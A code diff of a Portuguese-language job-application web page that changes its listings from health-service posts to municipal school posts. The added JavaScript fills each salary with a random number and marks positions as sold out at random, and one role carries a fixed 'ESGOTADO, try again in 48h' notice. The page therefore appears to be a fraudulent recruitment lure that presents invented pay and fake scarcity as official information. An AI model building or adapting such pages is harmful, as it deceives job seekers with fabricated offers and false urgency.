-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-administrativo" data-disponivel="true">
+                            data-cargo="auxiliar-admin" data-disponivel="true">
                             <div class="flex items-start justify-between">
                                 <div class="flex-1">
                                     <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar Administrativo</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio administrativo nas unidades de saúde do SUS.</p>
+                                    <p class="text-sm text-gray-600 mb-3">Apoio administrativo e organizacional nas
+                                        unidades de ensino municipais.</p>
                                     <div class="grid md:grid-cols-3 gap-4 text-sm">
                                         <div>
                                             <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.400,00 - R$ 4.600,00</p>
+                                            <p class="font-medium text-blue-600" id="salario-auxiliar-admin">R$ 0,00 -
+                                                R$ 0,00</p>
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Carga Horária:</span>
@@ -727,27 +309,30 @@
                                             <p class="font-semibold">Presencial</p>
                                         </div>
                                     </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
                                 </div>
                                 <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
+                                    <button
+                                        class="bg-blue-600 text-white px-4 py-2 rounded font-medium hover:bg-blue-700">
+                                        Selecionar Cargo
+                                    </button>
                                 </div>
                             </div>
                         </div>
 
+                        <!-- Cargo 2 -->
                         <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-enfermagem" data-disponivel="true">
+                            data-cargo="auxiliar-producao" data-disponivel="true">
                             <div class="flex items-start justify-between">
                                 <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Enfermagem</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio aos técnicos e enfermeiros nas atividades de cuidado ao paciente.</p>
+                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Produção Escolar
+                                    </h4>
+                                    <p class="text-sm text-gray-600 mb-3">Responsável pela preparação e distribuição da
+                                        alimentação nas escolas municipais.</p>
                                     <div class="grid md:grid-cols-3 gap-4 text-sm">
                                         <div>
                                             <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.800,00 - R$ 5.200,00</p>
+                                            <p class="font-medium text-blue-600" id="salario-auxiliar-producao">R$ 0,00
+                                                - R$ 0,00</p>
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Carga Horária:</span>
@@ -758,27 +343,29 @@
                                             <p class="font-semibold">Presencial</p>
                                         </div>
                                     </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
                                 </div>
                                 <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
+                                    <button
+                                        class="bg-blue-600 text-white px-4 py-2 rounded font-medium hover:bg-blue-700">
+                                        Selecionar Cargo
+                                    </button>
                                 </div>
                             </div>
                         </div>
 
+                        <!-- Cargo 3 -->
                         <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-farmacia" data-disponivel="true">
+                            data-cargo="auxiliar-secretaria" data-disponivel="true">
                             <div class="flex items-start justify-between">
                                 <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Farmácia</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio nas atividades farmacêuticas e controle de estoque.</p>
+                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Secretaria</h4>
+                                    <p class="text-sm text-gray-600 mb-3">Apoio nas atividades secretariais e
+                                        atendimento ao público nas escolas.</p>
                                     <div class="grid md:grid-cols-3 gap-4 text-sm">
                                         <div>
                                             <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.600,00 - R$ 4.900,00</p>
+                                            <p class="font-medium text-blue-600" id="salario-auxiliar-secretaria">R$
+                                                0,00 - R$ 0,00</p>
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Carga Horária:</span>
@@ -789,27 +376,30 @@
                                             <p class="font-semibold">Presencial</p>
                                         </div>
                                     </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
                                 </div>
                                 <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
+                                    <button
+                                        class="bg-blue-600 text-white px-4 py-2 rounded font-medium hover:bg-blue-700">
+                                        Selecionar Cargo
+                                    </button>
                                 </div>
                             </div>
                         </div>
 
+                        <!-- Cargo 4 -->
                         <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-saude-bucal" data-disponivel="true">
+                            data-cargo="auxiliar-seguranca" data-disponivel="true">
                             <div class="flex items-start justify-between">
                                 <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Saúde Bucal</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio aos dentistas e técnicos em saúde bucal.</p>
+                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Segurança Escolar
+                                    </h4>
+                                    <p class="text-sm text-gray-600 mb-3">Responsável pela segurança e vigilância das
+                                        unidades escolares.</p>
                                     <div class="grid md:grid-cols-3 gap-4 text-sm">
                                         <div>
                                             <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.500,00 - R$ 4.700,00</p>
+                                            <p class="font-medium text-blue-600" id="salario-auxiliar-seguranca">R$ 0,00
+                                                - R$ 0,00</p>
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Carga Horária:</span>
@@ -820,27 +410,30 @@
                                             <p class="font-semibold">Presencial</p>
                                         </div>
                                     </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
                                 </div>
                                 <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
+                                    <button
+                                        class="bg-blue-600 text-white px-4 py-2 rounded font-medium hover:bg-blue-700">
+                                        Selecionar Cargo
+                                    </button>
                                 </div>
                             </div>
                         </div>
 
+                        <!-- Cargo 5 -->
                         <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="recepcionista" data-disponivel="true">
+                            data-cargo="auxiliar-limpeza" data-disponivel="true">
                             <div class="flex items-start justify-between">
                                 <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Recepcionista</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Atendimento ao público nas unidades de saúde.</p>
+                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Serviços de Limpeza
+                                    </h4>
+                                    <p class="text-sm text-gray-600 mb-3">Manutenção da limpeza e higienização das
+                                        unidades escolares.</p>
                                     <div class="grid md:grid-cols-3 gap-4 text-sm">
                                         <div>
                                             <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.200,00 - R$ 4.300,00</p>
+                                            <p class="font-medium text-blue-600" id="salario-auxiliar-limpeza">R$ 0,00 -
+                                                R$ 0,00</p>
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Carga Horária:</span>
@@ -851,27 +444,30 @@
                                             <p class="font-semibold">Presencial</p>
                                         </div>
                                     </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
                                 </div>
                                 <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
+                                    <button
+                                        class="bg-blue-600 text-white px-4 py-2 rounded font-medium hover:bg-blue-700">
+                                        Selecionar Cargo
+                                    </button>
                                 </div>
                             </div>
                         </div>
 
+                        <!-- Cargo 6 -->
                         <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-almoxarifado" data-disponivel="true">
+                            data-cargo="auxiliar-cozinha" data-disponivel="true">
                             <div class="flex items-start justify-between">
                                 <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Almoxarifado</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Controle de materiais médicos e medicamentos.</p>
+                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Cozinha Escolar
+                                    </h4>
+                                    <p class="text-sm text-gray-600 mb-3">Apoio na preparação de refeições e manutenção
+                                        da cozinha escolar.</p>
                                     <div class="grid md:grid-cols-3 gap-4 text-sm">
                                         <div>
                                             <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.300,00 - R$ 4.400,00</p>
+                                            <p class="font-medium text-blue-600" id="salario-auxiliar-cozinha">R$ 0,00 -
+                                                R$ 0,00</p>
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Carga Horária:</span>
@@ -882,27 +478,30 @@
                                             <p class="font-semibold">Presencial</p>
                                         </div>
                                     </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
                                 </div>
                                 <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
+                                    <button
+                                        class="bg-blue-600 text-white px-4 py-2 rounded font-medium hover:bg-blue-700">
+                                        Selecionar Cargo
+                                    </button>
                                 </div>
                             </div>
                         </div>
 
+                        <!-- Cargo 7 -->
                         <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-arquivo-medico" data-disponivel="true">
+                            data-cargo="tecnico-manutencao" data-disponivel="true">
                             <div class="flex items-start justify-between">
                                 <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Arquivo Médico</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Organização e controle de prontuários e documentos médicos.</p>
+                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Manutenção Predial
+                                    </h4>
+                                    <p class="text-sm text-gray-600 mb-3">Manutenção preventiva e corretiva da
+                                        infraestrutura escolar.</p>
                                     <div class="grid md:grid-cols-3 gap-4 text-sm">
                                         <div>
                                             <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.400,00 - R$ 4.500,00</p>
+                                            <p class="font-medium text-blue-600" id="salario-tecnico-manutencao">R$ 0,00
+                                                - R$ 0,00</p>
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Carga Horária:</span>
@@ -913,27 +512,34 @@
                                             <p class="font-semibold">Presencial</p>
                                         </div>
                                     </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
                                 </div>
                                 <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
+                                    <button
+                                        class="bg-blue-600 text-white px-4 py-2 rounded font-medium hover:bg-blue-700">
+                                        Selecionar Cargo
+                                    </button>
                                 </div>
                             </div>
                         </div>
 
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-fisioterapia" data-disponivel="true">
+                        <!-- Cargo 8 - Indisponível -->
+                        <div class="cargo-option bg-red-50 border border-red-300 rounded p-4 opacity-75"
+                            data-cargo="secretario-escolar" data-disponivel="false">
                             <div class="flex items-start justify-between">
                                 <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Fisioterapia</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio em procedimentos fisioterápicos e reabilitação.</p>
+                                    <div class="flex items-center mb-2">
+                                        <h4 class="text-lg font-medium text-gray-800">• Secretário Escolar (home office)
+                                        </h4>
+                                        <span
+                                            class="ml-3 bg-red-500 text-white text-xs px-2 py-1 rounded-full">ESGOTADO</span>
+                                    </div>
+                                    <p class="text-sm text-gray-600 mb-3">Gestão secretarial e administrativa das
+                                        unidades escolares em modalidade remota.</p>
                                     <div class="grid md:grid-cols-3 gap-4 text-sm">
                                         <div>
                                             <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 4.800,00 - R$ 6.700,00</p>
+                                            <p class="font-medium text-blue-600" id="salario-secretario-escolar">R$ 0,00
+                                                - R$ 0,00</p>
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Carga Horária:</span>
@@ -941,178 +547,27 @@
                                         </div>
                                         <div>
                                             <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
+                                            <p class="font-semibold text-blue-600">Home Office</p>
                                         </div>
                                     </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
+                                    <p class="text-red-600 text-sm mt-2">
+                                        <i class="fas fa-exclamation-triangle mr-1"></i>
+                                        Vagas esgotadas para esta região. Tente novamente em 48h.
+                                    </p>
                                 </div>
                                 <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
+                                    <button
+                                        class="bg-gray-400 text-gray-600 px-4 py-2 rounded font-medium cursor-not-allowed"
+                                        disabled="">
+                                        Indisponível
+                                    </button>
                                 </div>
                             </div>
                         </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-seguranca" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Segurança do Trabalho</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Implementação de normas de segurança em unidades de saúde.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 5.500,00 - R$ 7.800,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-informatica" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Informática</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Suporte técnico em sistemas de saúde e equipamentos.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 5.000,00 - R$ 7.200,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-nutricao" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Nutrição</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio nas atividades de nutrição e alimentação hospitalar.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 4.500,00 - R$ 6.200,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-saude-bucal" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Saúde Bucal</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Assistência em procedimentos odontológicos nas UBS.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 4.600,00 - R$ 6.400,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-farmacia" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Farmácia</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Dispensação de medicamentos e controle farmacêutico.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 4.700,00 - R$ 6.600,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
                     </div>
                 </div>
 
+                <!-- Botão Iniciar Inscrição (aparece após seleção) -->
                 <div id="botao-inscricao" class="text-center py-8 hidden">
                     <div class="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-6">
                         <h3 class="text-lg font-semibold text-blue-800 mb-2">Cargo Selecionado</h3>
@@ -1138,6 +593,7 @@
             </div>
         </div>
 
+        <!-- Popup de Validação Continuada -->
         <div id="validation-popup"
             class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center hidden">
             <div class="bg-white rounded-lg p-6 max-w-md w-full mx-4 shadow-xl">
@@ -1145,8 +601,10 @@
                     <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                         <i class="fas fa-check-circle text-green-600 text-2xl"></i>
                     </div>
-                    <h3 id="validation-message" class="text-lg font-semibold text-gray-800 mb-2">Carregando dados regionais</h3>
-                    <p id="validation-details" class="text-sm text-gray-600 mb-4">Finalizando consulta de vagas disponíveis</p>
+                    <h3 id="validation-message" class="text-lg font-semibold text-gray-800 mb-2">Carregando dados
+                        regionais</h3>
+                    <p id="validation-details" class="text-sm text-gray-600 mb-4">Finalizando consulta de vagas
+                        disponíveis</p>
                     <div class="w-full bg-gray-200 rounded-full h-2 mb-4">
                         <div id="validation-progress" class="bg-green-600 h-2 rounded-full transition-all duration-500"
                             style="width: 100%"></div>
@@ -1161,186 +619,142 @@
                 const resultsSection = document.getElementById('results-section');
                 const cargoOptions = document.querySelectorAll('.cargo-option');
                 const validationPopup = document.getElementById('validation-popup');
+                const mostrarPopup = localStorage.getItem('mostrarPopupResultados');
                 const botaoInscricao = document.getElementById('botao-inscricao');
                 const cargoSelecionadoTexto = document.getElementById('cargo-selecionado-texto');
                 const salarioSelecionado = document.getElementById('salario-selecionado');
-                const loadingCepInfo = document.getElementById('loading-cep-info');
-                const cepInfo = document.getElementById('cep-info');
-                const localidadeInfo = document.getElementById('localidade-info');
-                const estadoInfo = document.getElementById('estado-info');
-                const bairroInfo = document.getElementById('bairro-info');
-                const logradouroInfo = document.getElementById('logradouro-info');
-                const codigoRegiao = document.getElementById('codigo-regiao');
-                const statusInfo = document.getElementById('status-info');
-                const textoLocalizacaoVagas = document.getElementById('texto-localizacao-vagas');
 
-
-                // --- CEP Retrieval and Display ---
-                const urlParams = new URLSearchParams(window.location.search);
-                let cep = urlParams.get('cep');
-                if (!cep) {
-                    cep = localStorage.getItem('cep');
+                if (mostrarPopup === 'true') {
+                    validationPopup.classList.remove('hidden');
+                    localStorage.removeItem('mostrarPopupResultados');
                 }
 
-                if (cep) {
-                    loadingCepInfo.textContent = cep; // Display CEP in loading screen
-                    cepInfo.textContent = cep; // Display CEP in the results section
-
-                    // Function to query ViaCEP API
-                    function consultarViaCEP(cepToSearch) {
-                        fetch(`https://viacep.com.br/ws/${cepToSearch}/json/`)
-                            .then(response => response.json())
-                            .then(data => {
-                                if (!data.erro) {
-                                    localidadeInfo.textContent = data.localidade || 'Não informado';
-                                    estadoInfo.textContent = data.uf || 'Não informado';
-                                    bairroInfo.textContent = data.bairro || 'Não informado';
-                                    logradouroInfo.textContent = data.logradouro || 'Não informado';
-                                    codigoRegiao.textContent = data.ibge || 'Não informado';
-                                    statusInfo.textContent = 'DISPONÍVEL';
-                                    statusInfo.classList.remove('bg-blue-100', 'text-blue-800', 'bg-red-200', 'text-red-800');
-                                    statusInfo.classList.add('bg-green-200', 'text-green-800');
-
-                                    textoLocalizacaoVagas.innerHTML = `
-                                        <i class="fas fa-info-circle mr-2 text-blue-600"></i>
-                                        Vagas disponíveis para ${data.localidade} - ${data.uf}. Selecione o cargo de interesse para prosseguir com a inscrição.
-                                    `;
-                                } else {
-                                    localidadeInfo.textContent = 'CEP não encontrado';
-                                    estadoInfo.textContent = 'N/A';
-                                    bairroInfo.textContent = 'N/A';
-                                    logradouroInfo.textContent = 'N/A';
-                                    codigoRegiao.textContent = 'N/A';
-                                    statusInfo.textContent = 'INDISPONÍVEL';
-                                    statusInfo.classList.remove('bg-blue-100', 'text-blue-800', 'bg-green-200', 'text-green-800');
-                                    statusInfo.classList.add('bg-red-200', 'text-red-800');
-                                    textoLocalizacaoVagas.innerHTML = `
-                                        <i class="fas fa-exclamation-triangle mr-2 text-red-600"></i>
-                                        Não foi possível encontrar vagas para o CEP informado. Por favor, verifique o CEP.
-                                    `;
-                                }
-                            })
-                            .catch(error => {
-                                console.error('Erro ao consultar ViaCEP:', error);
-                                localidadeInfo.textContent = 'Erro na consulta';
-                                estadoInfo.textContent = 'N/A';
-                                bairroInfo.textContent = 'N/A';
-                                logradouroInfo.textContent = 'N/A';
-                                codigoRegiao.textContent = 'N/A';
-                                statusInfo.textContent = 'ERRO';
-                                statusInfo.classList.remove('bg-blue-100', 'text-blue-800', 'bg-green-200', 'text-green-800');
-                                statusInfo.classList.add('bg-red-200', 'text-red-800');
-                                textoLocalizacaoVagas.innerHTML = `
-                                    <i class="fas fa-exclamation-triangle mr-2 text-red-600"></i>
-                                    Ocorreu um erro ao consultar o CEP. Tente novamente mais tarde.
-                                `;
-                            });
-                    }
-
-                    consultarViaCEP(cep); // Call the CEP lookup on page load
-                } else {
-                    // Handle case where no CEP is available from URL or localStorage
-                    loadingCepInfo.textContent = 'Não informado';
-                    cepInfo.textContent = 'Não informado';
-                    localidadeInfo.textContent = 'Erro na consulta';
-                    estadoInfo.textContent = 'N/A';
-                    bairroInfo.textContent = 'N/A';
-                    logradouroInfo.textContent = 'N/A';
-                    codigoRegiao.textContent = 'N/A';
-                    statusInfo.textContent = 'SEM CEP';
-                    statusInfo.classList.remove('bg-blue-100', 'text-blue-800', 'bg-green-200', 'text-green-800');
-                    statusInfo.classList.add('bg-red-200', 'text-red-800');
-                    textoLocalizacaoVagas.innerHTML = `
-                        <i class="fas fa-exclamation-triangle mr-2 text-red-600"></i>
-                        Nenhum CEP foi fornecido. Por favor, retorne à página anterior e insira seu CEP.
-                    `;
-                }
-
-                // --- Random Salary and Indisponible Logic ---
                 function gerarSalarioAleatorio(min, max) {
-                    const minVal = Math.floor(Math.random() * (max - min + 1)) + min;
-                    const maxVal = Math.floor(Math.random() * (max + 500 - minVal) + minVal);
-                    return `R$ ${minVal.toLocaleString('pt-BR', { minimumFractionDigits: 2 })} - R$ ${maxVal.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
+                    const minimo = Math.floor(Math.random() * (min + 200 - min) + min);
+                    const maximo = Math.floor(Math.random() * (max + 200 - max) + max);
+                    return `R$ ${minimo.toLocaleString('pt-BR', { minimumFractionDigits: 2 })} - R$ ${maximo.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
                 }
 
-                // Logic to make one random cargo unavailable.
-                // The 'Técnico em Hemoterapia' is hardcoded as unavailable in the HTML.
-                // This function would make *another* random available one unavailable if called.
                 function tornarCargoAleatorioIndisponivel() {
-                    const availableCargos = Array.from(document.querySelectorAll('.cargo-option[data-disponivel="true"]'));
-                    if (availableCargos.length > 0) {
-                        const randomIndex = Math.floor(Math.random() * availableCargos.length);
-                        const elementoCargo = availableCargos[randomIndex];
+                    const cargosDisponiveis = [
+                        'auxiliar-admin',
+                        'auxiliar-producao',
+                        'auxiliar-secretaria',
+                        'auxiliar-seguranca',
+                        'auxiliar-limpeza',
+                        'auxiliar-cozinha',
+                        'tecnico-manutencao'
+                    ];
 
+                    const cargoAleatorio = cargosDisponiveis[Math.floor(Math.random() * cargosDisponiveis.length)];
+                    const elementoCargo = document.querySelector(`[data-cargo="${cargoAleatorio}"]`);
+
